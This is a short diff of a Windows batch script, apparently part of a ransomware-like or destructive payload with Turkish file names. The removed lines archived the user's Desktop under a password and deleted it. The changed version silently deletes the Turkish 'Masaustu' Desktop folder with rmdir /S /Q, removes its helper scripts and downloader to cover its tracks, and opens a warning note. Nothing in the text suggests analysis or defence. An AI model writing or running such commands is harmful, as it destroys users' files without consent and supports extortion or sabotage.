@@ -1,8 +1,6 @@
-7z.exe a C:\Users\shnka\deneme C:\Users\shnka\Desktop\* -p123456
-rmdir /S /Q Desktop
+rmdir /S /Q Masaustu
 del islem.vbs
 del 7z.exe
 del indir.ps1
 notepad uyari.txt
 del islem.bat
-del Desktop
